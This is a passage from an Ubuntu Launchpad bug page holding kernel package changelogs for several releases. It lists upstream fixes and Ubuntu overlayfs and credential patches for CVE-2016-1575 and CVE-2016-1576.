- LP: #1540532
\* ALSA: hrtimer: Fix stall by hrtimer\_cancel()
- LP: #1540532
\* dmaengine: at\_xdmac: fix resume for cyclic transfers
- LP: #1540532
\* ALSA: pcm: Fix snd\_pcm\_hw\_params struct copy in compat mode
- LP: #1540532
\* ALSA: seq: Fix snd\_seq\_call\_port\_info\_ioctl in compat mode
- LP: #1540532
\* ALSA: control: Avoid kernel warnings from tlv ioctl with numid 0
- LP: #1540532
\* ARM: debug-ll: fix BCM63xx entry for multiplatform
- LP: #1540532
\* xfs: log mount failures don't wait for buffers to be released
- LP: #1540532
\* crypto: algif\_skcipher - Load TX SG list after waiting
- LP: #1540532
\* crypto: crc32c - Fix crc32c soft dependency
- LP: #1540532
\* IB/qib: fix mcast detach when qp not attached
- LP: #1540532
\* IB/qib: Support creating qps with GFP\_NOIO flag
- LP: #1540532
\* IB/mlx5: Expose correct maximum number of CQE capacity
- LP: #1540532
\* IB/cm: Fix a recently introduced deadlock
- LP: #1540532
\* ideapad-laptop: Add Lenovo ideapad Y700-17ISK to no\_hw\_rfkill dmi list
- LP: #1540532
\* Btrfs: fix deadlock running delayed iputs at transaction commit time
- LP: #1540532
\* iscsi-target: Fix potential dead-lock during node acl delete
- LP: #1540532
\* crypto: algif\_skcipher - sendmsg SG marking is off by one
- LP: #1540532
\* ALSA: hda - Flush the pending probe work at remove
- LP: #1540532
\* zsmalloc: fix migrate\_zspage-zs\_free race condition
- LP: #1540532
\* prctl: take mmap sem for writing to protect against others
- LP: #1540532
\* ALSA: timer: Handle disconnection more safely
- LP: #1540532
\* libceph: fix ceph\_msg\_revoke()
- LP: #1540532
\* MIPS: Loongson-3: Fix SMP\_ASK\_C0COUNT IPI handler
- LP: #1540532
\* MIPS: hpet: Choose a safe value for the ETIME check
- LP: #1540532
\* ocfs2: NFS hangs in \_\_ocfs2\_cluster\_lock due to race with
ocfs2\_unblock\_lock
- LP: #1540532
\* pNFS/flexfiles: Fix an XDR encoding bug in layoutreturn
- LP: #1540532
\* make sure that freeing shmem fast symlinks is RCU-delayed
- LP: #1540532
\* MAINTAINERS: return arch/sh to maintained state, with new maintainers
- LP: #1540532
\* MIPS: Fix some missing CONFIG\_CPU\_MIPSR6 #ifdefs
- LP: #1540532
\* ideapad-laptop: Add Lenovo Yoga 700 to no\_hw\_rfkill dmi list
- LP: #1540532
\* drm/i915: On fb alloc failure, unref gem object where it gets refed
- LP: #1540532
\* [media] rc: allow rc modules to be loaded if rc-main is not a module
- LP: #1540532
\* [media] lirc\_imon: do not leave imon\_probe() with mutex held
- LP: #1540532
\* SCSI: initio: remove duplicate module device table
- LP: #1540532
\* clk: xgene: Fix divider with non-zero shift value
- LP: #1540532
\* clk: st: avoid uninitialized variable use
- LP: #1540532
\* MAINTAINERS: gpio-brcmstb: Remove stray '>'
- LP: #1540532
\* ASoC: Intel: pass correct parameter in sst\_alloc\_stream\_mrfld()
- LP: #1540532
\* PCI/MSI: Initialize MSI capability for all architectures
- LP: #1540532
\* ath9k\_htc: check for underflow in ath9k\_htc\_rx\_msg()
- LP: #1540532
\* ASoC: tegra\_alc5632: check return value
- LP: #1540532
\* mtd: nand: fix ONFI parameter page layout
- LP: #1540532
\* mac80211: fix mgmt-tx abort cookie and leak
- LP: #1540532
\* mtd: nand: denali: add missing nand\_release() call in denali\_remove()
- LP: #1540532
\* Drivers: hv: util: catch allocation errors
- LP: #1540532
\* Drivers: hv: utils: use memdup\_user in hvt\_op\_write
- LP: #1540532
\* tpm\_tis: Use devm\_free\_irq not free\_irq
- LP: #1540532
\* ALSA: fm801: explicitly free IRQ line
- LP: #1540532
\* ARM: imx: select SRC for i.MX7
- LP: #1540532
\* ALSA: fm801: propagate TUNER\_ONLY bit when autodetected
- LP: #1540532
\* ALSA: fm801: detect FM-only card earlier
- LP: #1540532
\* pinctrl: bcm2835: Fix memory leak in error path
- LP: #1540532
\* mmc: sdhci: restore behavior when setting VDD via external regulator
- LP: #1540532
\* x86/LDT: Print the real LDT base address
- LP: #1540532
\* sysrq: Fix warning in sysrq generated crash.
- LP: #1540532
\* kconfig: return 'false' instead of 'no' in bool function
- LP: #1540532
\* perf/x86: Fix filter\_events() bug with event mappings
- LP: #1540532
\* perf/x86: fix PEBS issues on Intel Atom/Core2
- LP: #1540532
\* power: test\_power: correctly handle empty writes
- LP: #1540532
\* firmware: actually return NULL on failed request\_firmware\_nowait()
- LP: #1540532
\* target: Fix a memory leak in target\_dev\_lba\_map\_store()
- LP: #1540532
\* phy: micrel: Fix finding PHY properties in MAC node for KSZ9031.
- LP: #1540532
\* m68k/atari, m68k/sun3: Fix SCSI platform device registration when
driver is modular
- LP: #1540532
\* um: Fix build error and kconfig for i386
- LP: #1540532
\* net: sctp: prevent writes to cookie\_hmac\_alg from accessing invalid
memory
- LP: #1540532
\* ipv6: tcp: add rcu locking in tcp\_v6\_send\_synack()
- LP: #1540532
\* bonding: Prevent IPv6 link local address on enslaved devices
- LP: #1540532
\* kbuild: Demote 'sign-compare' warning to W=2
- LP: #1540532
\* mmc: sd: limit SD card power limit according to cards capabilities
- LP: #1540532
\* net: tcp\_memcontrol: properly detect ancestor socket pressure
- LP: #1540532
\* vmstat: make vmstat\_updater deferrable again and shut down on idle
- LP: #1540532
\* include/linux/memblock.h: fix ordering of 'flags' argument in comments
- LP: #1540532
\* Btrfs: clean up an error code in btrfs\_init\_space\_info()
- LP: #1540532
\* btrfs: initialize the seq counter in struct btrfs\_device
- LP: #1540532
\* bridge: fix lockdep addr\_list\_lock false positive splat
- LP: #1540532
\* batman-adv: Avoid recursive call\_rcu for batadv\_bla\_claim
- LP: #1540532
\* batman-adv: Avoid recursive call\_rcu for batadv\_nc\_node
- LP: #1540532
\* batman-adv: Drop immediate batadv\_orig\_ifinfo free function
- LP: #1540532
\* batman-adv: Drop immediate batadv\_neigh\_node free function
- LP: #1540532
\* batman-adv: Drop immediate neigh\_ifinfo free function
- LP: #1540532
\* batman-adv: Drop immediate orig\_node free function
- LP: #1540532
\* printk: help pr\_debug and pr\_devel to optimize out arguments
- LP: #1540532
\* ARM: dts: armadillo800eva Correct extal1 frequency to 24 MHz
- LP: #1540532
\* team: Replace rcu\_read\_lock with a mutex in team\_vlan\_rx\_kill\_vid
- LP: #1540532
\* mmc: debugfs: correct wrong voltage value
- LP: #1540532
\* IB/mlx4: Initialize hop\_limit when creating address handle
- LP: #1540532
\* net/mlx4: Remove unused macro
- LP: #1540532
\* NFSv4: Don't perform cached access checks before we've OPENed the file
- LP: #1540532
\* NFS: Ensure we revalidate attributes before using execute\_ok()
- LP: #1540532
\* veth: don’t modify ip\_summed; doing so treats packets with bad
checksums as good.
- LP: #1540532
\* net: cdc\_ncm: avoid changing RX/TX buffers on MTU changes
- LP: #1540532
\* sctp: sctp should release assoc when sctp\_make\_abort\_user return NULL
in sctp\_close
- LP: #1540532
\* connector: bump skb->users before callback invocation
- LP: #1540532
\* af\_unix: Fix splice-bind deadlock
- LP: #1540532
\* unix: properly account for FDs passed over unix sockets
- LP: #1540532
\* bridge: Only call /sbin/bridge-stp for the initial network namespace
- LP: #1540532
\* tcp\_yeah: don't set ssthresh below 2
- LP: #1540532
\* sched,cls\_flower: set key address type when present
- LP: #1540532
\* udp: disallow UFO for sockets with SO\_NO\_CHECK option
- LP: #1540532
\* net: preserve IP control block during GSO segmentation
- LP: #1540532
\* phonet: properly unshare skbs in phonet\_rcv()
- LP: #1540532
\* net: bpf: reject invalid shifts
- LP: #1540532
\* batman-adv: Drop immediate batadv\_hard\_iface free function
- LP: #1540532
\* vxlan: fix test which detect duplicate vxlan iface
- LP: #1540532
\* ipv6: update skb->csum when CE mark is propagated
- LP: #1540532
\* Linux 4.2.8-ckt3
- LP: #1540532
-- Luis Henriques <luis.henriques@canonical.com> Fri, 19 Feb 2016 10:25:02 +0000

| Changed in linux (Ubuntu Wily): | |
| --- | --- |
| **status**: | New → Fix Released |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Launchpad Janitor (janitor)](https://launchpad.net/~janitor) wrote on 2016-02-22: |  |  | [#10](/ubuntu/%2Bsource/linux/%2Bbug/1534961/comments/10) |
| --- | --- | --- | --- |

[Download full text](https://bugs.launchpad.net/ubuntu/%2Bsource/linux/%2Bbug/1534961/comments/10/%2Bdownload) (12.3 KiB)

This bug was fixed in the package linux - 3.19.0-51.57

---------------

linux (3.19.0-51.57) vivid; urgency=low

[ Seth Forshee ]

\* SAUCE: cred: Add clone\_cred() interface

    - LP: [#1531747](/bugs/1531747), [#1534961](/bugs/1534961), [#1535150](/bugs/1535150)

    - CVE-2016-1575 CVE-2016-1576

  \* SAUCE: overlayfs: Use mounter's credentials instead of selectively

    raising caps

    - LP: [#1531747](/bugs/1531747), [#1534961](/bugs/1534961), [#1535150](/bugs/1535150)

    - CVE-2016-1575 CVE-2016-1576

  \* SAUCE: overlayfs: Skip permission checking for trusted.overlayfs.\*

    xattrs

    - LP: [#1531747](/bugs/1531747), [#1534961](/bugs/1534961), [#1535150](/bugs/1535150)

    - CVE-2016-1575 CVE-2016-1576

  \* SAUCE: overlayfs: Be more careful about copying up sxid files

    - LP: [#1534961](/bugs/1534961), [#1535150](/bugs/1535150)

    - CVE-2016-1575 CVE-2016-1576

  \* SAUCE: overlayfs: Propogate nosuid from lower and upper mounts

    - LP: [#1534961](/bugs/1534961), [#1535150](/bugs/1535150)

    - CVE-2016-1575 CVE-2016-1576

linux (3.19.0-50.56) vivid; urgency=low

[ Brad Figg ]

\* Release Tracking Bug

    - LP: [#1540576](/bugs/1540576)

[ J. R. Okajima ]

\* SAUCE: ubuntu: aufs: tiny, extract a new func xino\_fwrite\_wkq()

    - LP: [#1533043](/bugs/1533043)

  \* SAUCE: ubuntu: aufs: for 4.3, XINO handles EINTR from the dying process

    - LP: [#1533043](/bugs/1533043)

[ John Johansen ]

\* SAUCE: (no-up): apparmor: fix for failed mediation of socket that is

    being shutdown

    - LP: [#1446906](/bugs/1446906)

[ Upstream Kernel Changes ]

\* drivers/base/memory.c: fix kernel warning during memory hotplug on

    ppc64

    - LP: [#1463654](/bugs/1463654)

  \* sched/wait: Fix signal handling in bit wait helpers

    - LP: [#1537859](/bugs/1537859)

  \* sched/wait: Fix the signal handling fix

    - LP: [#1537859](/bugs/1537859)

  \* ARC: Fix silly typo in MAINTAINERS file

    - LP: [#1537859](/bugs/1537859)

  \* ip6mr: call del\_timer\_sync() in ip6mr\_free\_table()

    - LP: [#1537859](/bugs/1537859)

  \* gre6: allow to update all parameters via rtnl

    - LP: [#1537859](/bugs/1537859)

  \* atl1c: Improve driver not to do order 4 GFP\_ATOMIC allocation

    - LP: [#1537859](/bugs/1537859)

  \* sctp: use the same clock as if sock source timestamps were on

    - LP: [#1537859](/bugs/1537859)

  \* sctp: update the netstamp\_needed counter when copying sockets

    - LP: [#1537859](/bugs/1537859)

  \* sctp: also copy sk\_tsflags when copying the socket

    - LP: [#1537859](/bugs/1537859)

  \* net: qca\_spi: fix transmit queue timeout handling

    - LP: [#1537859](/bugs/1537859)

  \* ipv6: sctp: clone options to avoid use after free

    - LP: [#1537859](/bugs/1537859)

  \* net: add validation for the socket syscall protocol argument

    - LP: [#1537859](/bugs/1537859)

  \* sh\_eth: fix kernel oops in skb\_put()

    - LP: [#1537859](/bugs/1537859)

  \* net: fix IP early demux races

    - LP: [#1537859](/bugs/1537859)

  \* vlan: Fix untag operations of stacked vlans with REORDER\_HEADER off

    - LP: [#1537859](/bugs/1537859)

  \* skbuff: Fix offset error in skb\_reorder\_vlan\_header

    - LP: [#1537859](/bugs/1537859)

  \* pptp: verify sockaddr\_len in pptp\_bind() and pptp\_connect()

    - LP: [#1537859](/bugs/1537859)

  \* bluetooth: Validate socket address length in sco\_sock\_bind().

    - LP: [#1537859](/bugs/1537859)

  \* fou: clean up socket with kfree\_rcu

    - LP: [#1537859](/bugs/1537859)

  \* af\_unix: Revert 'lock\_interruptible' in stream receive code

    - LP: [#1537859](/bugs/1537859)

  \* KEYS: Fix race between read and revoke

    - LP: [#1537859](/bugs/1537859)

  \* tools: Add a "make all" rule

    - LP: [#1537859](/bugs/1537859)

  \* efi: Disable interrupts around EFI calls, not in the epilog/prolog

    calls

    - LP: [#1537859](/bugs/1537859)

  \* fuse: break infinite loop in fuse\_fill\_write\_pages()

    - LP: [#1537859](/bugs/1537859)

  \* usb: gadget: pxa2...

This bug was fixed in the package linux - 3.19.0-51.57
---------------
linux (3.19.0-51.57) vivid; urgency=low
[ Seth Forshee ]
\* SAUCE: cred: Add clone\_cred() interface
- LP: #1531747, #1534961, #1535150
- CVE-2016-1575 CVE-2016-1576
\* SAUCE: overlayfs: Use mounter's credentials instead of selectively
raising caps
- LP: #1531747, #1534961, #1535150
- CVE-2016-1575 CVE-2016-1576
\* SAUCE: overlayfs: Skip permission checking for trusted.overlayfs.\*
xattrs
- LP: #1531747, #1534961, #1535150
- CVE-2016-1575 CVE-2016-1576
\* SAUCE: overlayfs: Be more careful about copying up sxid files
- LP: #1534961, #1535150
- CVE-2016-1575 CVE-2016-1576
\* SAUCE: overlayfs: Propogate nosuid from lower and upper mounts
- LP: #1534961, #1535150
- CVE-2016-1575 CVE-2016-1576
linux (3.19.0-50.56) vivid; urgency=low
[ Brad Figg ]
\* Release Tracking Bug
- LP: #1540576
[ J. R. Okajima ]
\* SAUCE: ubuntu: aufs: tiny, extract a new func xino\_fwrite\_wkq()
- LP: #1533043
\* SAUCE: ubuntu: aufs: for 4.3, XINO handles EINTR from the dying process
- LP: #1533043
[ John Johansen ]
\* SAUCE: (no-up): apparmor: fix for failed mediation of socket that is
being shutdown
- LP: #1446906
[ Upstream Kernel Changes ]
\* drivers/base/memory.c: fix kernel warning during memory hotplug on
ppc64
- LP: #1463654
\* sched/wait: Fix signal handling in bit wait helpers
- LP: #1537859
\* sched/wait: Fix the signal handling fix
- LP: #1537859
\* ARC: Fix silly typo in MAINTAINERS file
- LP: #1537859
\* ip6mr: call del\_timer\_sync() in ip6mr\_free\_table()
- LP: #1537859
\* gre6: allow to update all parameters via rtnl
- LP: #1537859
\* atl1c: Improve driver not to do order 4 GFP\_ATOMIC allocation
- LP: #1537859
\* sctp: use the same clock as if sock source timestamps were on
- LP: #1537859
\* sctp: update the netstamp\_needed counter when copying sockets
- LP: #1537859
\* sctp: also copy sk\_tsflags when copying the socket
- LP: #1537859
\* net: qca\_spi: fix transmit queue timeout handling
- LP: #1537859
\* ipv6: sctp: clone options to avoid use after free
- LP: #1537859
\* net: add validation for the socket syscall protocol argument
- LP: #1537859
\* sh\_eth: fix kernel oops in skb\_put()
- LP: #1537859
\* net: fix IP early demux races
- LP: #1537859
\* vlan: Fix untag operations of stacked vlans with REORDER\_HEADER off
- LP: #1537859
\* skbuff: Fix offset error in skb\_reorder\_vlan\_header
- LP: #1537859
\* pptp: verify sockaddr\_len in pptp\_bind() and pptp\_connect()
- LP: #1537859
\* bluetooth: Validate socket address length in sco\_sock\_bind().
- LP: #1537859
\* fou: clean up socket with kfree\_rcu
- LP: #1537859
\* af\_unix: Revert 'lock\_interruptible' in stream receive code
- LP: #1537859
\* KEYS: Fix race between read and revoke
- LP: #1537859
\* tools: Add a "make all" rule
- LP: #1537859
\* efi: Disable interrupts around EFI calls, not in the epilog/prolog
calls
- LP: #1537859
\* fuse: break infinite loop in fuse\_fill\_write\_pages()
- LP: #1537859
\* usb: gadget: pxa27x: fix suspend callback
- LP: #1537859
\* iio: fix some warning messages
- LP: #1537859
\* USB: cp210x: Remove CP2110 ID from compatibility list
- LP: #1537859
\* USB: cdc\_acm: Ignore Infineon Flash Loader utility
- LP: #1537859
\* ext4: Fix handling of extended tv\_sec
- LP: #1537859
\* jbd2: Fix unreclaimed pages after truncate in data=journal mode
- LP: #1537859
\* drm/ttm: Fixed a read/write lock imbalance
- LP: #1537859
\* i2c: mv64xxx: The n clockdiv factor is 0 based on sunxi SoCs
- LP: #1537859
\* AHCI: Fix softreset failed issue of Port Multiplier
- LP: #1537859
\* sata\_sil: disable trim
- LP: #1537859
\* usb-storage: Fix scsi-sd failure "Invalid field in cdb" for USB adapter
JMicron
- LP: #1537859
\* staging: lustre: echo\_copy..\_lsm() dereferences userland pointers
directly
- LP: #1537859
\* irqchip/versatile-fpga: Fix PCI IRQ mapping on Versatile PB
- LP: #1537859
\* usb: core : hub: Fix BOS 'NULL pointer' kernel panic
- LP: #1537859
\* USB: whci-hcd: add check for dma mapping error
- LP: #1537859
\* usb: Use the USB\_SS\_MULT() macro to decode burst multiplier for log
message
- LP: #1537859
\* xen/events/fifo: Consume unprocessed events when a CPU dies
- LP: #1537859
\* dm btree: fix leak of bufio-backed block in btree\_split\_sibling error
path
- LP: #1537859
\* ARM: 8465/1: mm: keep reserved ASIDs in sync with mm after multiple
rollovers
- LP: #1537859
\* perf: Fix PERF\_EVENT\_IOC\_PERIOD deadlock
- LP: #1537859
\* usb: xhci: fix config fail of FS hub behind a HS hub with MTT
- LP: #1537859
\* ALSA: rme96: Fix unexpected volume reset after rate changes
- LP: #1537859
\* net: mvpp2: fix missing DMA region unmap in egress processing
- LP: #1537859
\* net: mvpp2: fix buffers' DMA handling on RX path
- LP: #1537859
\* net: mvpp2: fix refilling BM pools in RX path
- LP: #1537859
\* dmaengine: at\_xdmac: fix macro typo
- LP: #1537859
\* ALSA: hda - Add inverted dmic for Packard Bell DOTS
- LP: #1523232, #1537859
\* vhost: relax log address alignment
- LP: #1537859
\* virtio: fix memory leak of virtio ida cache layers
- LP: #1537859
\* IB/srp: Fix a memory leak
- LP: #1537859
\* IB/srp: Fix possible send queue overflow
- LP: #1537859
\* ALSA: hda - Fixing speaker noise on the two latest thinkpad models
- LP: #1523517, #1537859
\* 9p: ->evict\_inode() should kick out ->i\_data, not ->i\_mapping
- LP: #1537859
\* radeon/cik: Fix GFX IB test on Big-Endian
- LP: #1537859
\* radeon: Fix VCE ring test for Big-Endian systems
- LP: #1537859
\* radeon: Fix VCE IB test on Big-Endian systems
- LP: #1537859
\* video: fbdev: fsl: Fix kernel crash when diu\_ops is not implemented
- LP: #1537859
\* crypto: skcipher - Copy iv from desc even for 0-len walks
- LP: #1537859
\* ALSA: hda - Fix noise problems on Thinkpad T440s
- LP: #1537859
\* dm thin metadata: fix bug when taking a metadata snapshot
- LP: #1537859
\* dm space map metadata: fix ref counting bug when bootstrapping a new
space map
- LP: #1537859
\* ipmi: move timer init to before irq is setup
- LP: #1537859
\* ASoC: es8328: Fix deemphasis values
- LP: #1537859
\* KVM: PPC: Book3S HV: Prohibit setting illegal transaction state in MSR
- LP: #1537859
\* rfkill: copy the name into the rfkill struct
- LP: #1537859
\* dm btree: fix bufio buffer leaks in dm\_btree\_del() error path
- LP: #1537859
\* ses: Fix problems with simple enclosures
- LP: #1537859
\* vgaarb: fix signal handling in vga\_get()
- LP: #1537859
\* ASoC: davinci-mcasp: Fix XDATA check in mcasp\_start\_tx
- LP: #1537859
\* ARM: dts: vf610: use reset values for L2 cache latencies
- LP: #1537859
\* ses: fix additional element traversal bug
- LP: #1537859
\* xhci: fix usb2 resume timing and races.
- LP: #1537859
\* USB: add quirk for devices with broken LPM
- LP: #1537859
\* powercap / RAPL: fix BIOS lock check
- LP: #1537859
\* parisc iommu: fix panic due to trying to allocate too large region
- LP: #1537859
\* mm: hugetlb: fix hugepage memory leak caused by wrong reserve count
- LP: #1537859
\* vmstat: Reduce time interval to stat update on idle cpu
- LP: #1537859
\* mm, vmstat: allow WQ concurrency to discover memory reclaim doesn't
make any progress
- LP: #1537859
\* mm: hugetlb: call huge\_pte\_alloc() only if ptep is null
- LP: #1537859
\* drivers/base/memory.c: prohibit offlining of memory blocks with missing
sections
- LP: #1537859
\* ocfs2: fix SGID not inherited issue
- LP: #1537859
\* sh64: fix \_\_NR\_fgetxattr
- LP: #1537859
\* ASoC: wm8974: set cache type for regmap
- LP: #1537859
\* n\_tty: Fix poll() after buffer-limited eof push read
- LP: #1537859
\* tty: Fix GPF in flush\_to\_ldisc()
- LP: #1537859
\* genirq: Prevent chip buslock deadlock
- LP: #1537859
\* ALSA: usb-audio: Add a more accurate volume quirk for AudioQuest
DragonFly
- LP: #1537859
\* ARM: dts: imx6: Fix Ethernet PHY mode on Ventana boards
- LP: #1537859
\* ARM: 8471/1: need to save/restore arm register(r11) when it is
corrupted
- LP: #1537859
\* ALSA: hda - Add a fixup for Thinkpad X1 Carbon 2nd
- LP: #1537859
\* spi: fix parent-device reference leak
- LP: #1537859
\* scripts: recordmcount: break hardlinks
- LP: #1537859
\* dma-debug: Fix dma\_debug\_entry offset calculation
- LP: #1537859
\* ftrace/scripts: Have recordmcount copy the object file
- LP: #1537859
\* ARC: dw2 unwind: Reinstante unwinding out of modules
- LP: #1537859
\* ARC: dw2 unwind: Ignore CIE version !=1 gracefully instead of bailing
- LP: #1537859
\* powerpc/powernv: pr\_warn\_once on unsupported OPAL\_MSG type
- LP: #1537859
\* ALSA: hda - Set SKL+ hda controller power at freeze() and thaw()
- LP: #1537859
\* s390/dis: Fix handling of format specifiers
- LP: #1537859
\* airspy: increase USB control message buffer size
- LP: #1537859
\* USB: ipaq.c: fix a timeout loop
- LP: #1537859
\* USB: fix invalid memory access in hub\_activate()
- LP: #1537859
\* x86/mce: Ensure offline CPUs don't participate in rendezvous process
- LP: #1537859
\* i2c: rcar: disable runtime PM correctly in slave mode
- LP: #1537859
\* parisc: Fix syscall restarts
- LP: #1537859
\* ALSA: hda/realtek - Fix silent headphone output on MacPro 4,1 (v2)
- LP: #1537859
\* MIPS: uaccess: Fix strlen\_user with EVA
- LP: #1537859
\* ASoC: arizona: Fix bclk for sample rates that are multiple of 4kHz
- LP: #1537859
\* arm: fix handling of F\_OFD\_... in oabi\_fcntl64()
- LP: #1537859
\* ocfs2: fix BUG when calculate new backup super
- LP: #1537859
\* mm/memory\_hotplug.c: check for missing sections in
test\_pages\_in\_a\_zone()
- LP: #1537859
\* ftrace/scripts: Fix incorrect use of sprintf in recordmcount
- LP: #1537859
\* tracing: Fix setting of start\_index in find\_next()
- LP: #1537859
\* tile: provide CONFIG\_PAGE\_SIZE\_64KB etc for tilepro
- LP: #1537859
\* ARM: versatile: fix MMC/SD interrupt assignment
- LP: #1537859
\* async\_tx: use GFP\_NOWAIT rather than GFP\_IO
- LP: #1537859
\* dts: vt8500: Add SDHC node to DTS file for WM8650
- LP: #1537859
\* ftrace/module: Call clean up function when module init fails early
- LP: #1537859
\* vmstat: allocate vmstat\_wq before it is used
- LP: #1537859
\* usb: musb: USB\_TI\_CPPI41\_DMA requires dmaengine support
- LP: #1537859
\* sctp: convert sack\_needed and sack\_generation to bits
- LP: #1537859
\* sctp: start t5 timer only when peer rwnd is 0 and local state is
SHUTDOWN\_PENDING
- LP: #1537859
\* pinctrl: bcm2835: Fix initial value for direction\_output
- LP: #1537859
\* net: phy: mdio-mux: Check return value of mdiobus\_alloc()
- LP: #1537859
\* sh\_eth: fix TX buffer byte-swapping
- LP: #1537859
\* mISDN: fix a loop count
- LP: #1537859
\* amd-xgbe: fix a couple timeout loops
- LP: #1537859
\* qlcnic: fix a timeout loop
- LP: #1537859
\* ser\_gigaset: fix deallocation of platform device structure
- LP: #1537859
\* net: fix warnings in 'make htmldocs' by moving macro definition out of
field declaration
- LP: #1537859
\* net/mlx4\_en: Remove dependency between timestamping capability and
service\_task
- LP: #1537859
\* net/mlx4\_en: Fix HW timestamp init issue upon system startup
- LP: #1537859
\* include/linux/mmdebug.h: should include linux/bug.h
- LP: #1537859
\* ipv6/addrlabel: fix ip6addrlbl\_get()
- LP: #1537859
\* ASoC: Use nested lock for snd\_soc\_dapm\_mutex\_lock
- LP: #1537859
\* net: filter: make JITs zero A for SKF\_AD\_ALU\_XOR\_X
- LP: #1537859
\* net: sched: fix missing free per cpu on qstats
- LP: #1537859
\* net: possible use after free in dst\_release
- LP: #1537859
\* kvm: x86: only channel 0 of the i8254 is linked to the HPET
- LP: #1537859
\* firmware: dmi\_scan: Fix UUID endianness for SMBIOS >= 2.6
- LP: #1537859
\* Linux 3.19.8-ckt13
- LP: #1537859
\* hotplugcpu: Avoid deadlocks by waking active\_writer
- LP: #1481357
\* xfrm: dst\_entries\_init() per-net dst\_ops
- LP: #1486670
-- Luis Henriques <luis.henriques@canonical.com> Fri, 19 Feb 2016 11:12:52 +0000

| Changed in linux (Ubuntu Vivid): | |
| --- | --- |
| **status**: | New → Fix Released |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Launchpad Janitor (janitor)](https://launchpad.net/~janitor) wrote on 2016-02-22: |  |  | [#11](/ubuntu/%2Bsource/linux/%2Bbug/1534961/comments/11) |
| --- | --- | --- | --- |

[Download full text](https://bugs.launchpad.net/ubuntu/%2Bsource/linux/%2Bbug/1534961/comments/11/%2Bdownload) (9.5 KiB)

This bug was fixed in the package linux - 3.13.0-79.123

---------------

linux (3.13.0-79.123) trusty; urgency=low

[ Seth Forshee ]

\* SAUCE: cred: Add clone\_cred() interface

    - LP: [#1534961](/bugs/1534961), [#1535150](/bugs/1535150)

    - CVE-2016-1575 CVE-2016-1576

  \* SAUCE: overlayfs: Use mounter's credentials instead of full kernel

    credentials

    - LP: [#1534961](/bugs/1534961), [#1535150](/bugs/1535150)

    - CVE-2016-1575 CVE-2016-1576

  \* SAUCE: overlayfs: Skip permission checking for trusted.overlayfs.\*

    xattrs

    - LP: [#1534961](/bugs/1534961), [#1535150](/bugs/1535150)

    - CVE-2016-1575 CVE-2016-1576

  \* SAUCE: overlayfs: Be more careful about copying up sxid files

    - LP: [#1534961](/bugs/1534961), [#1535150](/bugs/1535150)

    - CVE-2016-1575 CVE-2016-1576

  \* SAUCE: overlayfs: Propogate nosuid from lower and upper mounts

    - LP: [#1534961](/bugs/1534961), [#1535150](/bugs/1535150)

    - CVE-2016-1575 CVE-2016-1576

linux (3.13.0-78.122) trusty; urgency=low

[ Brad Figg ]

\* Release Tracking Bug

    - LP: [#1540559](/bugs/1540559)

[ Eric Dumazet ]

\* SAUCE: (no-up) udp: properly support MSG\_PEEK with truncated buffers

    - LP: [#1527902](/bugs/1527902)

[ J. R. Okajima ]

\* SAUCE: ubuntu: aufs: tiny, extract a new func xino\_fwrite\_wkq()

    - LP: [#1533043](/bugs/1533043)

  \* SAUCE: ubuntu: aufs: for 4.3, XINO handles EINTR from the dying process

    - LP: [#1533043](/bugs/1533043)

[ Upstream Kernel Changes ]

\* Revert "[stable-only] net: add length argument to

    skb\_copy\_and\_csum\_datagram\_iovec"

    - LP: [#1538756](/bugs/1538756)

  \* unregister\_netdevice : move RTM\_DELLINK to until after ndo\_uninit

    - LP: [#1525324](/bugs/1525324)

  \* rtnetlink: delay RTM\_DELLINK notification until after ndo\_uninit()

    - LP: [#1525324](/bugs/1525324)

  \* Drivers: hv: Eliminate the channel spinlock in the callback path

    - LP: [#1519897](/bugs/1519897)

  \* Drivers: hv: vmbus: Implement per-CPU mapping of relid to channel

    - LP: [#1519897](/bugs/1519897)

  \* Drivers: hv: vmbus: Suport an API to send pagebuffers with additional

    control

    - LP: [#1519897](/bugs/1519897)

  \* Drivers: hv: vmbus: Suport an API to send packet with additional

    control

    - LP: [#1519897](/bugs/1519897)

  \* Drivers: hv: vmbus: Export the vmbus\_sendpacket\_pagebuffer\_ctl()

    - LP: [#1519897](/bugs/1519897)

  \* Drivers: hv: vmbus: Fix a siganlling host signalling issue

    - LP: [#1519897](/bugs/1519897)

  \* Drivers: hv: vmbus: Fix a Host signaling bug

    - LP: [#1519897](/bugs/1519897)

  \* ARC: Fix silly typo in MAINTAINERS file

    - LP: [#1538756](/bugs/1538756)

  \* ip6mr: call del\_timer\_sync() in ip6mr\_free\_table()

    - LP: [#1538756](/bugs/1538756)

  \* gre6: allow to update all parameters via rtnl

    - LP: [#1538756](/bugs/1538756)

  \* atl1c: Improve driver not to do order 4 GFP\_ATOMIC allocation

    - LP: [#1538756](/bugs/1538756)

  \* sctp: use the same clock as if sock source timestamps were on

    - LP: [#1538756](/bugs/1538756)

  \* sctp: update the netstamp\_needed counter when copying sockets

    - LP: [#1538756](/bugs/1538756)

  \* ipv6: sctp: clone options to avoid use after free

    - LP: [#1538756](/bugs/1538756)

  \* net: add validation for the socket syscall protocol argument

    - LP: [#1538756](/bugs/1538756)

  \* sh\_eth: fix kernel oops in skb\_put()

    - LP: [#1538756](/bugs/1538756)

  \* pptp: verify sockaddr\_len in pptp\_bind() and pptp\_connect()

    - LP: [#1538756](/bugs/1538756)

  \* bluetooth: Validate socket address length in sco\_sock\_bind().

    - LP: [#1538756](/bugs/1538756)

  \* af\_unix: Revert 'lock\_interruptible' in stream receive code

    - LP: [#1538756](/bugs/1538756)

  \* KEYS: Fix race between read and revoke

    - LP: [#1538756](/bugs/1538756)

  \* tools: Add a "make all" rule

    - LP: [#1538](/bugs/1538)...

[Read more...](/ubuntu/%2Bsource/linux/%2Bbug/1534961/comments/11)

This bug was fixed in the package linux - 3.13.0-79.123
---------------
linux (3.13.0-79.123) trusty; urgency=low
[ Seth Forshee ]
\* SAUCE: cred: Add clone\_cred() interface
- LP: #1534961, #1535150
- CVE-2016-1575 CVE-2016-1576
\* SAUCE: overlayfs: Use mounter's credentials instead of full kernel
credentials
- LP: #1534961, #1535150
- CVE-2016-1575 CVE-2016-1576
\* SAUCE: overlayfs: Skip permission checking for trusted.overlayfs.\*
xattrs
- LP: #1534961, #1535150
- CVE-2016-1575 CVE-2016-1576
\* SAUCE: overlayfs: Be more careful about copying up sxid files
- LP: #1534961, #1535150
- CVE-2016-1575 CVE-2016-1576
\* SAUCE: overlayfs: Propogate nosuid from lower and upper mounts
- LP: #1534961, #1535150
- CVE-2016-1575 CVE-2016-1576
